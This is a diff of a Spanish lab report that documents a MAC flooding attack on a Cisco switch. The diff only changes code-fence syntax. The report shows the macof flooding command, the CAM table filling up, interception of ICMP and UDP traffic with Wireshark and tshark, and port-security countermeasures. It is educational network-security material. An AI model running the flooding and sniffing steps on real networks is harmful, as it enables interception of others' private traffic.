@@ -72,7 +72,7 @@ Los switches de capa 2 mantienen una tabla de direcciones MAC (CAM table) que ma
 
 ## Configuración Base del Switch
 
-```{.cisco-ios}
+::: cisco-ios
 hostname SW1
 enable secret cisco123
 !
@@ -91,11 +91,11 @@ interface range FastEthernet0/4-24
 line con 0
  password cisco
  login
-```
+:::
 
 ## Estado Inicial de la Tabla MAC
 
-```{.cisco-ios}
+::: cisco-ios
 Switch# show mac address-table
           Mac Address Table
 -------------------------------------------
@@ -105,7 +105,7 @@ Vlan    Mac Address       Type        Ports
    1    7456.3cb7.4d63    DYNAMIC     Fa0/2
    1    7456.3cb7.0f23    DYNAMIC     Fa0/3
 Total Mac Addresses for this criterion: 3
-```
+:::
 
 # Desarrollo Detallado
 
@@ -113,18 +113,18 @@ Total Mac Addresses for this criterion: 3
 
 En PC C (atacante):
 
-```{.bash}
+::: bash
 sudo apt update && sudo apt install dsniff -y
 which macof  # Verificar instalación
-```
+:::
 
 ## Comportamiento Normal del Switch
 
 Prueba de conectividad inicial entre PC A y PC B:
 
-```{.bash}
+::: bash
 ping -c 4 192.168.1.20
-```
+:::
 
 ::: info
 **Comportamiento normal:** PC C NO puede interceptar el tráfico entre PC A y PC B debido a la segmentación del switch.
@@ -134,9 +134,9 @@ ping -c 4 192.168.1.20
 
 En PC C, ejecutar el ataque:
 
-```{.bash}
+::: bash
 sudo macof -i eno1 -s random -d random
-```
+:::
 
 ![Ejecución del comando macof en terminal](images/terminal-icmp-flooding-01.png)
 
@@ -144,13 +144,13 @@ sudo macof -i eno1 -s random -d random
 
 Durante el ataque:
 
-```{.cisco-ios}
+::: cisco-ios
 Switch# show mac address-table count
 Dynamic Address Count:               7992
 Static  Address Count:               0
 Total Mac Addresses In Use:          7992
 Total Mac Addresses Space Available:    48
-```
+:::
 
 ![Estado de la tabla MAC durante la saturación](images/ios-mac-table-flooded-01.png)
 
@@ -169,14 +169,16 @@ Con macof ejecutándose, realizar ping entre PC A y PC B y capturar en PC C con 
 ## Prueba con Tráfico UDP
 
 **Receptor (PC B):**
-```{.bash}
+
+::: bash
 nc -lu 1234
-```
+:::
 
 **Transmisor (PC A):**
-```{.bash}
+
+::: bash
 echo "Mensaje secreto" | nc -u 192.168.1.20 1234
-```
+:::
 
 **Captura en PC C:** Filtro `udp and ip.dst == 192.168.1.20`
 
@@ -209,13 +211,14 @@ echo "Mensaje secreto" | nc -u 192.168.1.20 1234
 4. Capturar tráfico en PC C con Wireshark desde PC C
 
 **Comandos utilizados:**
-```{.bash}
+
+::: bash
 # PC A - Generación de tráfico
 ping -c 20 -i 0.5 192.168.1.20
 
 # PC C - Captura simultánea
 tshark -i eno1 -f "icmp" -c 20
-```
+:::
 
 ::: success
 **Validación exitosa:** Se confirmó la intercepción del 100% del tráfico ICMP entre PC A y PC B.
@@ -243,12 +246,13 @@ Al detener macof, el switch recupera automáticamente su comportamiento normal:
 - **tshark:** Interfaz de línea de comandos para captura automatizada
 
 ### Comandos Cisco IOS Críticos
-```{.cisco-ios}
+
+::: cisco-ios
 show mac address-table
 show mac address-table count
 clear mac address-table dynamic
 show interfaces status
-```
+:::
 
 ## Lecciones Aprendidas
 
@@ -266,12 +270,13 @@ La detección temprana requiere monitoreo automatizado de:
 
 ### Configuración Defensiva
 Implementar port security básico:
-```{.cisco-ios}
+
+::: cisco-ios
 interface range FastEthernet0/1-24
  switchport port-security
  switchport port-security maximum 2
  switchport port-security violation restrict
-```
+:::
 
 # Exploración de Aplicaciones y Sugerencias
 
@@ -280,7 +285,7 @@ interface range FastEthernet0/1-24
 ### 1. Implementación de Port Security Avanzado
 Configurar diferentes niveles de port security para evaluar su efectividad:
 
-```{.cisco-ios}
+::: cisco-ios
 ! Configuración restrictiva
 interface FastEthernet0/1
  switchport port-security
@@ -294,7 +299,7 @@ interface FastEthernet0/2
  switchport port-security maximum 2
  switchport port-security violation restrict
  switchport port-security aging time 10
-```
+:::
 
 **Investigación sugerida:** Evaluar el impacto en rendimiento y usabilidad de cada modo de violación.
 
